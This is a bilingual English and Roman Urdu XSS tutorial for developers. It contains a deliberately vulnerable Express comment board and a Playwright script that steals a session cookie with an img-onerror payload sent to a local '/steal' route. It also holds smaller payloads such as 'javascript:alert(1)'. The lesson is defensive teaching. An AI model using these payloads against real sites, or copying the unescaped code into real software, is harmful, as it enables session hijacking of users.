@@ -1,0 +1,686 @@
+---
+title: "Cross-Site Scripting (XSS)"
+summary: "XSS lets an attacker run their JavaScript in your users' browsers, on your site, with your users' sessions. Learn from zero the three kinds (stored, reflected and DOM-based), then watch all three steal a session cookie from a real Chrome browser controlled by Playwright. Fix them with output escaping, textContent instead of innerHTML and an HttpOnly cookie, and see a Content Security Policy block every attack on its own even when the code is still vulnerable. All verified with Express 5, Playwright 1.65 and Chrome."
+level: intermediate
+minutes: 40
+prerequisites: ["Injection (SQL, NoSQL, Command)", "The DOM"]
+tags: ["Security", "XSS", "CSP", "Browser", "Express"]
+---
+
+<BigIdea>
+<Tr>
+<En>
+**Cross-site scripting (XSS)** is injection into **HTML**: user input ends up in a page in a way the browser reads as **markup or code**, so an attacker's `<script>` or `onerror="…"` runs in other users' browsers, on your domain. From there it can do anything the user can: read their non-HttpOnly cookies and tokens, call your API as them, change their email, show fake login forms. **Stored XSS** saves the payload (a comment, a profile name) and hits everyone who views it; **reflected XSS** bounces it off a URL parameter in a link the victim clicks; **DOM-based XSS** happens entirely in client JavaScript, for example `innerHTML` with data from `location.hash`. The fix is **context-aware output encoding**: turn `<` into `&lt;` when inserting text into HTML (templating engines and React do this by default), use **`textContent`** instead of `innerHTML`, sanitize the rare cases where you must allow rich HTML (DOMPurify), and add defense in depth: **HttpOnly** cookies so scripts can't read sessions, and a **Content Security Policy** that stops inline and foreign scripts from running at all.
+</En>
+<Ur>
+**Cross-site scripting (XSS)** **HTML** me injection hai: user ka input page me aise pohanchta hai ke browser use **markup ya code** samajhta hai, isliye hamla awar ka `<script>` ya `onerror="…"` doosre users ke browsers me, aap ke domain par chalta hai. Wahan se ye har woh kaam kar sakta hai jo user kar sakta hai: un ki non-HttpOnly cookies aur tokens parhna, un ki taraf se aap ki API bulana, un ki email badalna, nakli login forms dikhana. **Stored XSS** payload save karta hai (comment, profile ka naam) aur use dekhne wale har shakhs ko lagta hai; **reflected XSS** use URL parameter se ulta wapas bhejta hai, aise link me jo victim dabata hai; **DOM-based XSS** poori tarah client JavaScript me hota hai, maslan `location.hash` ke data ke saath `innerHTML`. Hal **context ke mutabiq output encoding** hai: HTML me text daalte waqt `<` ko `&lt;` banayen (templating engines aur React default me ye karte hain), `innerHTML` ke bajaye **`textContent`** lein, un kam halaton me sanitize karein jahan rich HTML zaroori ho (DOMPurify), aur gehri hifazat jorein: **HttpOnly** cookies taa ke scripts sessions na parh sakein, aur **Content Security Policy** jo inline aur bahar ke scripts ko chalne hi na de.
+</Ur>
+</Tr>
+</BigIdea>
+
+## At a glance
+
+<Glance>
+<What>
+<Tr>
+<En>
+
+| Type | Where the payload lives | Example | Fix |
+| --- | --- | --- | --- |
+| Stored | your database | comment `<img src=x onerror=…>` | escape on output |
+| Reflected | the URL of a crafted link | `/search?q=<img…>` | escape on output |
+| DOM-based | client-side JS sinks | `el.innerHTML = location.hash` | `textContent`, safe DOM APIs |
+| Any of them | — | — | CSP + HttpOnly cookies limit the damage |
+
+</En>
+<Ur>
+
+| Qism | Payload kahan rehta hai | Misaal | Hal |
+| --- | --- | --- | --- |
+| Stored | aap ka database | comment `<img src=x onerror=…>` | output par escape |
+| Reflected | banaye gaye link ka URL | `/search?q=<img…>` | output par escape |
+| DOM-based | client JS ke sinks | `el.innerHTML = location.hash` | `textContent`, mehfooz DOM APIs |
+| Koi bhi | — | — | CSP + HttpOnly cookies nuqsaan mehdood karte hain |
+
+</Ur>
+</Tr>
+</What>
+<Why>
+<Tr>
+<En>
+
+- XSS runs with the victim's full session on your site: account takeover, data theft, actions on their behalf.
+- One stored payload can hit every visitor, including admins.
+- It bypasses CSRF protections, because the attack comes from your own origin.
+- It's still one of the most common web vulnerabilities in bug bounty reports.
+
+</En>
+<Ur>
+
+- XSS aap ki site par victim ke poore session ke saath chalta hai: account chheenna, data chori, un ki taraf se kaam.
+- Ek stored payload har visitor ko lag sakta hai, admins samet.
+- Ye CSRF hifazat bypass karta hai, kyunke hamla aap ke apne origin se aata hai.
+- Bug bounty reports me ye ab bhi sab se aam web kamzoriyon me se hai.
+
+</Ur>
+</Tr>
+</Why>
+<When>
+<Tr>
+<En>
+
+| Inserting user data into | Do this |
+| --- | --- |
+| HTML text | escape `& < > " '` (template engine or React default) |
+| An HTML attribute | quote it and escape; never into `onclick`, `href="javascript:…"` |
+| A URL (`href`, `src`) | validate the scheme is `http(s):`; encode the parameter |
+| JavaScript | don't; pass data through `data-*` attributes or JSON in a `<script type="application/json">` |
+| The DOM from client JS | `textContent`, `setAttribute`, `createElement`, never `innerHTML` with input |
+| Rich text that must keep some HTML | sanitize with DOMPurify, allowlisting tags |
+
+</En>
+<Ur>
+
+| User data kahan daalna | Ye karein |
+| --- | --- |
+| HTML text | `& < > " '` escape (template engine ya React default) |
+| HTML attribute | quote aur escape karein; `onclick`, `href="javascript:…"` me kabhi nahi |
+| URL (`href`, `src`) | scheme `http(s):` hone ki tasdeeq; parameter encode |
+| JavaScript | nahi; data `data-*` attributes ya `<script type="application/json">` me JSON se bhejein |
+| Client JS se DOM | `textContent`, `setAttribute`, `createElement`, input ke saath `innerHTML` kabhi nahi |
+| Rich text jis me kuch HTML rehna zaroori | DOMPurify se sanitize, tags allowlist |
+
+</Ur>
+</Tr>
+</When>
+<How>
+<Tr>
+<En>
+
+```text
+// server: escape when building HTML yourself (or use a template engine / React)
+const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+
+// browser
+el.textContent = userInput;                     // not el.innerHTML
+
+// defense in depth
+Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
+```
+
+</En>
+<Ur>
+
+```text
+// server: khud HTML banate waqt escape (ya template engine / React)
+const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+
+// browser
+el.textContent = userInput;                     // el.innerHTML nahi
+
+// gehri hifazat
+Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'
+```
+
+</Ur>
+</Tr>
+</How>
+</Glance>
+
+## Picture it
+
+<Tr>
+<En>
+
+Think of a **noticeboard in an office** where a robot reads every note aloud and does what notes say if they're written as instructions.
+
+- A visitor pins a note: "Nice office! ROBOT: photocopy everyone's keycards and send them to me." The robot obeys, for every employee who walks past: **stored XSS**.
+- A prank email contains a link that makes the robot read a sentence printed on the link itself: **reflected XSS**.
+- Escaping means the robot reads notes **only as text**: "ROBOT: photocopy…" is read out as words, never followed.
+- HttpOnly is putting the keycards in a safe the robot can't open, and CSP is a rule wired into the robot: "only follow instructions from the company handbook" (scripts from your own origin), so even a note that slips through is ignored.
+
+</En>
+<Ur>
+
+**Daftar ka noticeboard** socheyn jahan ek robot har note parh kar sunata hai aur agar note hidayat ki shakal me ho to us par amal karta hai.
+
+- Ek visitor note lagata hai: "Achha daftar! ROBOT: sab ke keycards copy kar ke mujhe bhejo." Robot har us mulazim ke liye amal karta hai jo paas se guzre: **stored XSS**.
+- Ek mazaq wali email me link hai jo robot se link par chhapa jumla parhwata hai: **reflected XSS**.
+- Escaping ka matlab robot notes **sirf text ki tarah** parhta hai: "ROBOT: copy…" alfaaz ki tarah suna jata hai, amal kabhi nahi.
+- HttpOnly keycards ko aisi tijori me rakhna hai jo robot khol nahi sakta, aur CSP robot me laga usool hai: "sirf company handbook ki hidayaten mano" (aap ke apne origin ke scripts), isliye guzar jane wala note bhi nazar andaz hota hai.
+
+</Ur>
+</Tr>
+
+## Words you'll see
+
+<Tr>
+<En>
+
+| Word | What it means | Example |
+| --- | --- | --- |
+| **XSS** | Injected script runs in other users' browsers | `<img onerror=…>` |
+| **Payload** | The attacker's code | `fetch('/steal?c='+document.cookie)` |
+| **Stored XSS** | Payload saved on the server | comments, profiles |
+| **Reflected XSS** | Payload echoed from the request | search pages, error pages |
+| **DOM-based XSS** | Payload handled by client JS | `innerHTML`, `document.write` |
+| **Sink** | A dangerous API that interprets strings | `innerHTML`, `eval`, `href` |
+| **Output encoding / escaping** | Turning `<` into `&lt;` etc. | `esc()` |
+| **Context** | Where data lands: HTML, attribute, URL, JS | each needs its own encoding |
+| **Sanitization** | Removing dangerous parts of HTML | DOMPurify |
+| **HttpOnly** | Cookie unreadable by JavaScript | session cookies |
+| **CSP** | Header telling the browser which scripts may run | `script-src 'self'` |
+| **Nonce** | One-time token allowing a specific inline script | `script-src 'nonce-…'` |
+
+</En>
+<Ur>
+
+| Lafz | Matlab | Misaal |
+| --- | --- | --- |
+| **XSS** | Ghusaya script doosre users ke browsers me chale | `<img onerror=…>` |
+| **Payload** | Hamla awar ka code | `fetch('/steal?c='+document.cookie)` |
+| **Stored XSS** | Server par save payload | comments, profiles |
+| **Reflected XSS** | Request se ulta lautaya payload | search pages, error pages |
+| **DOM-based XSS** | Client JS ka sambhala payload | `innerHTML`, `document.write` |
+| **Sink** | Strings ko samajhne wali khatarnak API | `innerHTML`, `eval`, `href` |
+| **Output encoding / escaping** | `<` ko `&lt;` waghaira banana | `esc()` |
+| **Context** | Data kahan girta hai: HTML, attribute, URL, JS | har ek ki apni encoding |
+| **Sanitization** | HTML ke khatarnak hisse hatana | DOMPurify |
+| **HttpOnly** | JavaScript se na parhi jane wali cookie | session cookies |
+| **CSP** | Header jo browser ko batata hai kaunse scripts chal sakte hain | `script-src 'self'` |
+| **Nonce** | Khaas inline script ki ijazat wala ek dafa ka token | `script-src 'nonce-…'` |
+
+</Ur>
+</Tr>
+
+## Learn it step by step
+
+<Walkthrough>
+
+<Step title="Three kinds of XSS, in a real browser">
+
+<Tr>
+<En>
+`board.js` is a comment board with three bugs: comments are inserted into HTML unescaped (**stored**), the search page echoes `q` (**reflected**), and `welcome.js` puts `location.hash` into `innerHTML` (**DOM-based**). Its `/steal` route plays the attacker's server. `attack.js` posts a comment with an `<img onerror>` payload, then a real Chrome (driven by Playwright) logs in as Jane and visits the three pages. It reports whether the payload ran and what it stole.
+</En>
+<Ur>
+`board.js` teen bugs wala comment board hai: comments bina escape ke HTML me daale jate hain (**stored**), search page `q` wapas dikhata hai (**reflected**), aur `welcome.js` `location.hash` ko `innerHTML` me daalta hai (**DOM-based**). Is ka `/steal` route hamla awar ke server ka kirdar ada karta hai. `attack.js` `<img onerror>` payload wala comment bhejta hai, phir asli Chrome (Playwright se chalaya) Jane ki tarah login kar ke teeno pages dekhta hai. Ye batata hai ke payload chala ya nahi aur kya chura liya.
+</Ur>
+</Tr>
+
+```bash
+npm init -y > /dev/null && npm pkg set type=module && npm install express@5.1.0 --silent && npm install -D @playwright/test@1.65.1 --silent
+cat > board.js <<'EOF'
+// A tiny comment board. SAFE=1 turns on the fixes, CSP=1 only the Content-Security-Policy (next step).
+import express from 'express';
+const SAFE = process.env.SAFE === '1';
+const CSP = SAFE || process.env.CSP === '1';
+const app = express();
+app.use(express.urlencoded({ extended: false }));
+const comments = [];
+export const stolen = [];
+const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+const out = (s) => (SAFE ? esc(s) : s);                          // the whole difference for HTML output
+
+app.use((req, res, next) => {
+  if (CSP) res.set('Content-Security-Policy', "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'");
+  next();
+});
+app.get('/login', (req, res) => {                                // the victim's session cookie
+  res.cookie('session', 'jane-secret-session', { httpOnly: SAFE, sameSite: 'lax' }).send('ok');
+});
+app.post('/comments', (req, res) => { comments.push(req.body.text); res.redirect('/'); });
+app.get('/', (req, res) => res.send(`<!doctype html><title>Board</title><h1>Comments</h1>
+  <ul>${comments.map((c) => `<li>${out(c)}</li>`).join('')}</ul>`));                        // STORED
+app.get('/search', (req, res) => res.send(`<!doctype html><title>Search</title>
+  <p>Results for: ${out(req.query.q ?? '')}</p>`));                                           // REFLECTED
+app.get('/welcome', (req, res) => res.send(`<!doctype html><title>Welcome</title>
+  <p id="hello"></p><script src="/welcome.js"></script>`));
+app.get('/welcome.js', (req, res) => res.type('js').send(SAFE
+  ? `document.getElementById('hello').textContent = 'Hello, ' + decodeURIComponent(location.hash.slice(1));`
+  : `document.getElementById('hello').innerHTML = 'Hello, ' + decodeURIComponent(location.hash.slice(1));`));   // DOM-based
+app.get('/steal', (req, res) => { stolen.push(req.query.c || '(empty)'); res.sendStatus(204); });   // the "attacker's server"
+export default app;
+EOF
+cat > attack.js <<'EOF'
+import { chromium } from '@playwright/test';
+import app, { stolen } from './board.js';
+const server = app.listen(3000);
+const steal = `fetch('/steal?c='+encodeURIComponent(document.cookie))`;
+const payload = `<img src=x onerror="${steal}">`;
+
+// The attacker posts a comment (stored XSS)
+await fetch('http://localhost:3000/comments', { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ text: `Nice post! ${payload}` }) });
+
+// The victim, Jane, is logged in and just browses
+const browser = await chromium.launch({ channel: 'chrome' });
+const page = await browser.newPage();
+const blocked = [];
+page.on('console', (m) => { if (/Content Security Policy/.test(m.text())) blocked.push(m.text()); });
+await page.goto('http://localhost:3000/login');
+const visit = async (label, url) => {
+  const before = stolen.length;
+  await page.goto(url);
+  await page.waitForTimeout(300);                               // give an injected script time to phone home
+  console.log(`${label.padEnd(10)} ${stolen.length > before ? 'EXECUTED, attacker got: ' + stolen.at(-1) : 'did not run'}`);
+};
+await visit('stored', 'http://localhost:3000/');
+await visit('reflected', 'http://localhost:3000/search?q=' + encodeURIComponent(payload));
+await visit('dom-based', 'http://localhost:3000/welcome#' + encodeURIComponent(payload));
+console.log('what Jane sees in the comment list:', JSON.stringify(await page.goto('http://localhost:3000/').then(() => page.locator('li').innerText())));
+if (blocked.length) console.log('CSP violations reported by the browser:', blocked.length);
+await browser.close(); server.close();
+EOF
+node attack.js
+```
+
+```text output
+stored     EXECUTED, attacker got: session=jane-secret-session
+reflected  EXECUTED, attacker got: session=jane-secret-session
+dom-based  EXECUTED, attacker got: session=jane-secret-session
+what Jane sees in the comment list: "Nice post! "
+```
+
+<Happened>
+<Tr>
+<En>
+
+- **Stored**: the comment's `<img src=x>` failed to load, so its `onerror` ran in Jane's browser and sent `document.cookie` to the attacker. Jane only opened the home page. Every visitor would have been hit.
+- **Reflected**: the payload lived only in the URL. The attacker just needs Jane to click a link to your real domain (in an email, a chat, a forum post).
+- **DOM-based**: the server never even saw the payload, since the part after `#` isn't sent to servers. Client JavaScript put it into `innerHTML`, and the browser created the `<img>` with its handler.
+- Jane saw a harmless "Nice post!": the image was broken and invisible. XSS is usually silent.
+- The cookie wasn't **HttpOnly**, so `document.cookie` exposed the session. With it, the attacker can be Jane until the session expires.
+
+</En>
+<Ur>
+
+- **Stored**: comment ka `<img src=x>` load nahi hua, isliye us ka `onerror` Jane ke browser me chala aur `document.cookie` hamla awar ko bhej di. Jane ne sirf home page khola tha. Har visitor ko lagta.
+- **Reflected**: payload sirf URL me tha. Hamla awar ko bas Jane se aap ke asli domain ka link dabwana hai (email, chat, forum post me).
+- **DOM-based**: server ne payload dekha hi nahi, kyunke `#` ke baad wala hissa servers ko nahi bheja jata. Client JavaScript ne use `innerHTML` me daala, aur browser ne handler ke saath `<img>` bana diya.
+- Jane ne masoom "Nice post!" dekha: tasveer tooti aur nazar na aane wali thi. XSS aam taur par khamosh hota hai.
+- Cookie **HttpOnly** nahi thi, isliye `document.cookie` ne session khol diya. Is se hamla awar session expire hone tak Jane ban sakta hai.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="The fixes, and CSP as a safety net">
+
+<Tr>
+<En>
+First with **all fixes** (`SAFE=1`): output is escaped with `esc()`, `welcome.js` uses `textContent`, the session cookie is **HttpOnly**, and every response carries a strict **Content-Security-Policy**. Then with **CSP only** (`CSP=1`): the escaping bugs, `innerHTML` and the readable cookie are all still there, and only the header is added. The same attack script runs both times.
+</En>
+<Ur>
+Pehle **saare fixes** ke saath (`SAFE=1`): output `esc()` se escape hota hai, `welcome.js` `textContent` istemal karta hai, session cookie **HttpOnly** hai, aur har jawab ke saath sakht **Content-Security-Policy** hai. Phir **sirf CSP** (`CSP=1`): escaping bugs, `innerHTML` aur parhne layak cookie sab ab bhi mojood hain, sirf header joda gaya hai. Wahi attack script dono dafa chalta hai.
+</Ur>
+</Tr>
+
+```bash
+echo "=== all fixes: escaping, textContent, HttpOnly cookie, CSP"
+SAFE=1 node attack.js
+echo "=== CSP only: the code still has every XSS bug, but the browser refuses to run inline code"
+CSP=1 node attack.js
+```
+
+```text output
+=== all fixes: escaping, textContent, HttpOnly cookie, CSP
+stored     did not run
+reflected  did not run
+dom-based  did not run
+what Jane sees in the comment list: "Nice post! <img src=x onerror=\"fetch('/steal?c='+encodeURIComponent(document.cookie))\">"
+=== CSP only: the code still has every XSS bug, but the browser refuses to run inline code
+stored     did not run
+reflected  did not run
+dom-based  did not run
+what Jane sees in the comment list: "Nice post! "
+CSP violations reported by the browser: 4
+```
+
+<Happened>
+<Tr>
+<En>
+
+- **With all fixes**, none of the three ran. Jane now sees the comment exactly as it was typed, `<img src=x onerror=…>` as **text**: escaping doesn't delete input, it makes the browser display it instead of executing it.
+- **With CSP only**, the vulnerable HTML still reached the browser (the comment again looks like "Nice post!", because the `<img>` tag is real markup), but the browser **refused to run the inline `onerror` handler** and reported **4 CSP violations** (the home page twice, search and welcome). `script-src 'self'` allows only script files from your own origin; inline handlers, inline `<script>` blocks and scripts from other domains are blocked.
+- CSP is a **safety net**, not the fix: it doesn't stop HTML injection (an attacker could still inject a fake login form or links), older or misconfigured policies can be bypassed, and a policy loosened with `'unsafe-inline'` protects little. Escape output first, then add CSP and HttpOnly so a bug you miss doesn't become an account takeover. The next lessons cover CSP and headers in depth.
+
+</En>
+<Ur>
+
+- **Saare fixes ke saath** teeno me se koi nahi chala. Jane ab comment bilkul waisa dekhti hai jaisa type hua tha, `<img src=x onerror=…>` **text** ki tarah: escaping input mitata nahi, browser se use chalane ke bajaye dikhwata hai.
+- **Sirf CSP ke saath** kamzor HTML ab bhi browser tak pohncha (comment phir "Nice post!" lagta hai, kyunke `<img>` tag asli markup hai), magar browser ne **inline `onerror` handler chalane se inkaar kiya** aur **4 CSP violations** report kin (home page do dafa, search aur welcome). `script-src 'self'` sirf aap ke apne origin ki script files ki ijazat deta hai; inline handlers, inline `<script>` blocks aur doosre domains ke scripts rok diye jate hain.
+- CSP **hifazati jaal** hai, hal nahi: ye HTML injection nahi rokta (hamla awar ab bhi nakli login form ya links ghusa sakta hai), purani ya ghalat configured policies bypass ho sakti hain, aur `'unsafe-inline'` se dheeli ki gayi policy kam hifazat karti hai. Pehle output escape karein, phir CSP aur HttpOnly jorein taa ke chhoot jane wala bug account chheenne me na badle. Agle lessons CSP aur headers ko tafseel se dekhte hain.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+</Walkthrough>
+
+## Common mistakes
+
+<Compare>
+<Bad title="Bypassing the framework's escaping">
+
+```text
+// React
+<div dangerouslySetInnerHTML={{ __html: comment.body }} />
+// Vue
+<div v-html="comment.body"></div>
+// EJS
+<%- comment.body %>
+```
+
+</Bad>
+<Good title="Let the framework escape, sanitize when HTML is required">
+
+```text
+<div>{comment.body}</div>                                   // React escapes text
+<div v-text="comment.body"></div>                           // Vue
+<%= comment.body %>                                         // EJS escaped output
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(markdownHtml) }} />   // only when needed
+```
+
+</Good>
+</Compare>
+
+<Compare>
+<Bad title="Input filtering as the only defense">
+
+```text
+const clean = input.replace(/<script>/gi, '');   // <img onerror>, <svg onload>, <scr<script>ipt> all survive
+```
+
+</Bad>
+<Good title="Encode for the output context">
+
+```text
+html:      esc(input)
+attribute: `<a title="${esc(input)}">`
+url:       new URL(input).protocol in { 'http:':1, 'https:':1 } ? input : '#'
+dom:       el.textContent = input
+```
+
+</Good>
+</Compare>
+
+<Tr>
+<En>
+
+More mistakes to avoid:
+
+- **`href` with user URLs** without checking the scheme: `javascript:alert(1)` runs on click.
+- **Putting data into inline `<script>`** with string concatenation: a `</script>` in the data breaks out.
+- **Escaping on input instead of output**: the same data later goes into a different context (JSON, attribute) with the wrong encoding.
+- **Session tokens in `localStorage`**: any XSS reads them; HttpOnly cookies can't be read by scripts.
+- **CSP with `'unsafe-inline'` or wildcard sources**: it looks like protection but stops little.
+- **Markdown renderers allowing raw HTML** without sanitizing.
+
+</En>
+<Ur>
+
+Bachne wali mazeed ghaltiyan:
+
+- **User URLs ke saath `href`** bina scheme check: `javascript:alert(1)` click par chalta hai.
+- **Inline `<script>` me data** string jor kar daalna: data me `</script>` bahar nikal aata hai.
+- **Output ke bajaye input par escape**: wahi data baad me ghalat encoding ke saath doosre context (JSON, attribute) me jata hai.
+- **Session tokens `localStorage` me**: koi bhi XSS unhe parh leta hai; HttpOnly cookies scripts nahi parh sakte.
+- **`'unsafe-inline'` ya wildcard sources wali CSP**: hifazat lagti hai magar kam rokti hai.
+- **Bina sanitize kiye raw HTML ki ijazat dene wale Markdown renderers**.
+
+</Ur>
+</Tr>
+
+## Try it yourself
+
+<Challenge title="Escape for each context">
+
+<Tr>
+<En>
+A profile page shows a user's `name`, `website` and `bio`. Write the server-side code to render: the name in an `<h1>`, the website as a link, and the name again inside a `title` attribute. What would happen with `name = '"><img src=x onerror=alert(1)>'` and `website = 'javascript:alert(1)'` in your code?
+</En>
+<Ur>
+Profile page user ka `name`, `website` aur `bio` dikhata hai. Render karne ka server-side code likhein: `<h1>` me naam, link ki tarah website, aur `title` attribute me dobara naam. Aap ke code me `name = '"><img src=x onerror=alert(1)>'` aur `website = 'javascript:alert(1)'` ke saath kya hota?
+</Ur>
+</Tr>
+
+<Solution>
+
+<Tr>
+<En>
+
+```text
+const safeUrl = (u) => { try { const x = new URL(u); return ['http:', 'https:'].includes(x.protocol) ? x.href : '#'; } catch { return '#'; } };
+html = `<h1 title="${esc(user.name)}">${esc(user.name)}</h1>
+        <a href="${esc(safeUrl(user.website))}" rel="nofollow noopener">Website</a>`;
+```
+
+The name becomes `&quot;&gt;&lt;img …&gt;`: the quote can't close the attribute and the tag can't open, so it shows as text. The `javascript:` URL fails the scheme check and becomes `#`. Escaping alone wouldn't stop `javascript:` because it contains no special HTML characters.
+
+</En>
+<Ur>
+
+```text
+const safeUrl = (u) => { try { const x = new URL(u); return ['http:', 'https:'].includes(x.protocol) ? x.href : '#'; } catch { return '#'; } };
+html = `<h1 title="${esc(user.name)}">${esc(user.name)}</h1>
+        <a href="${esc(safeUrl(user.website))}" rel="nofollow noopener">Website</a>`;
+```
+
+Naam `&quot;&gt;&lt;img …&gt;` ban jata hai: quote attribute band nahi kar sakta aur tag khul nahi sakta, isliye text ki tarah dikhta hai. `javascript:` URL scheme check me nakam ho kar `#` ban jata hai. Akeli escaping `javascript:` nahi rokti kyunke is me koi khaas HTML huroof nahi.
+
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+<Challenge title="Allow some formatting safely">
+
+<Tr>
+<En>
+Comments should allow bold, italics and links, but nothing else. Describe how you'd store, render and protect them, and what your CSP would be.
+</En>
+<Ur>
+Comments me bold, italics aur links ki ijazat honi chahiye, aur kuch nahi. Batayen aap unhe kaise store, render aur mehfooz karenge, aur aap ki CSP kya hogi.
+</Ur>
+</Tr>
+
+<Solution>
+
+<Tr>
+<En>
+
+1. Store the original text (or Markdown) as typed; don't store HTML you generated.
+2. On render, convert Markdown to HTML with raw HTML **disabled**, then sanitize: `DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'strong', 'i', 'em', 'a', 'p', 'br'], ALLOWED_ATTR: ['href'] })`, and force `rel="nofollow noopener"` on links.
+3. Only allow `http:`/`https:` links (DOMPurify blocks `javascript:` by default).
+4. CSP: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`, no `'unsafe-inline'` for scripts.
+5. HttpOnly session cookie, and a test that posts known XSS payloads and checks nothing executes (like the Playwright script).
+
+</En>
+<Ur>
+
+1. Asal text (ya Markdown) waisa hi rakhein jaisa type hua; apna banaya HTML store na karein.
+2. Render par Markdown ko raw HTML **band** kar ke HTML banayen, phir sanitize: `DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'strong', 'i', 'em', 'a', 'p', 'br'], ALLOWED_ATTR: ['href'] })`, aur links par `rel="nofollow noopener"` lazmi.
+3. Sirf `http:`/`https:` links ki ijazat (DOMPurify default me `javascript:` rokta hai).
+4. CSP: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`, scripts ke liye `'unsafe-inline'` nahi.
+5. HttpOnly session cookie, aur aisa test jo maloom XSS payloads bheje aur check kare ke kuch na chale (Playwright script ki tarah).
+
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+## Quick quiz
+
+<Quiz>
+<Question q="Which XSS type never reaches the server?">
+<Option>Stored</Option>
+<Option>Reflected</Option>
+<Option correct>DOM-based using location.hash</Option>
+<Explanation>The fragment after # isn't sent in HTTP requests.</Explanation>
+</Question>
+<Question q="What does escaping do to an attacker's img tag?">
+<Option>Deletes it</Option>
+<Option correct>Makes the browser display it as text instead of creating an element</Option>
+<Option>Encrypts it</Option>
+<Explanation>The comment was shown exactly as typed.</Explanation>
+</Question>
+<Question q="Why did the attacker get the session cookie in step 1?">
+<Option>The site used HTTP</Option>
+<Option correct>The cookie wasn't HttpOnly, so document.cookie could read it</Option>
+<Option>SameSite was missing</Option>
+<Explanation>HttpOnly hides cookies from scripts.</Explanation>
+</Question>
+<Question q="With CSP only, why did the payload not run?">
+<Option>The HTML was escaped</Option>
+<Option correct>script-src 'self' blocks inline event handlers</Option>
+<Option>Chrome removed the img tag</Option>
+<Explanation>The browser reported CSP violations instead.</Explanation>
+</Question>
+<Question q="Which is safe for inserting user text in client JavaScript?">
+<Option>innerHTML</Option>
+<Option correct>textContent</Option>
+<Option>document.write</Option>
+<Explanation>textContent never parses HTML.</Explanation>
+</Question>
+</Quiz>
+
+## Remember
+
+<Takeaways>
+<Tr>
+<En>
+
+- XSS = user input interpreted as HTML or JavaScript in someone else's browser.
+- Escape output for its context; trust your framework's default escaping and avoid its escape hatches.
+- In the browser use `textContent`; validate URL schemes; sanitize rich HTML with DOMPurify.
+- HttpOnly cookies keep sessions out of reach of scripts.
+- A strict CSP is a strong safety net, not a replacement for escaping.
+
+</En>
+<Ur>
+
+- XSS = user input ka kisi aur ke browser me HTML ya JavaScript ki tarah samjha jana.
+- Output us ke context ke mutabiq escape karein; framework ki default escaping par bharosa karein aur us ke escape hatches se bachein.
+- Browser me `textContent` lein; URL schemes check karein; rich HTML DOMPurify se sanitize karein.
+- HttpOnly cookies sessions ko scripts ki pohanch se door rakhti hain.
+- Sakht CSP mazboot hifazati jaal hai, escaping ka badal nahi.
+
+</Ur>
+</Tr>
+</Takeaways>
+
+## Go deeper
+
+<Tr>
+<En>
+The sections below are for when you're comfortable with the basics, or getting ready for interviews.
+</En>
+<Ur>
+Neeche ke hisse tab ke liye hain jab basics achi tarah samajh aa jayen, ya interview ki tayyari ho.
+</Ur>
+</Tr>
+
+<DeepDive title="More about XSS">
+
+**Nonce- and hash-based CSP.** Apps that need inline scripts use `script-src 'nonce-RANDOM' 'strict-dynamic'`, with a fresh nonce per response added to their own `<script>` tags; injected scripts don't have it.
+
+**Trusted Types.** `require-trusted-types-for 'script'` makes the browser reject strings in sinks like `innerHTML` unless they pass through a policy, eliminating most DOM XSS in Chromium browsers.
+
+**Framework edges.** React escapes text but not `href="javascript:…"` in older versions, `dangerouslySetInnerHTML`, or server-rendered JSON in `<script>`; Next.js and others provide safe serialization.
+
+**Mutation XSS.** Browsers sometimes rewrite HTML so sanitized markup becomes dangerous after parsing; that's why using a maintained sanitizer matters more than writing your own.
+
+**Self-XSS and clickjacking.** Social engineering that convinces users to paste code into DevTools, or framing your site invisibly; the `frame-ancestors` CSP directive handles the latter.
+
+</DeepDive>
+
+<DeepDive title="Real world: the display name that became admin">
+
+A SaaS dashboard let users set a display name, shown in the admin panel's user list without escaping (the admin panel was an older template than the main app). An attacker set their name to a short payload that loaded a script from their domain. When a support admin opened the user list, the script ran with the admin's session and created a new admin account for the attacker through the internal API.
+
+The fixes:
+
+1. The admin panel moved to the same template engine with auto-escaping, and a lint rule blocks unescaped output tags.
+2. A strict CSP with nonces on all pages, including internal tools.
+3. Session cookies set HttpOnly and admin actions requiring recent re-authentication.
+4. New admin accounts trigger an alert and require approval from a second admin.
+
+</DeepDive>
+
+<DeepDive title="Security lens">
+
+- **Internal tools need the same protections**: admins are the most valuable XSS targets.
+- **Treat every source of data as untrusted**: user profiles, file names, email subjects, webhook payloads, even data imported from partners.
+- **Defense in depth**: escaping, HttpOnly + SameSite cookies, CSP, Trusted Types, and re-authentication for sensitive actions.
+- **Use CSP reporting** (`report-to`) to learn about blocked injections in production.
+- **Test with real browsers**: payloads behave differently than they look in source code, as the Playwright demo showed.
+
+</DeepDive>
+
+<DeepDive title="Interview questions">
+
+<QA q="What is XSS and what are its types?">
+Cross-site scripting is injecting script into pages viewed by other users. Stored XSS persists on the server, reflected XSS comes from the current request such as a URL parameter, and DOM-based XSS occurs in client-side code that writes untrusted data to dangerous sinks.
+</QA>
+
+<QA q="How do you prevent XSS?">
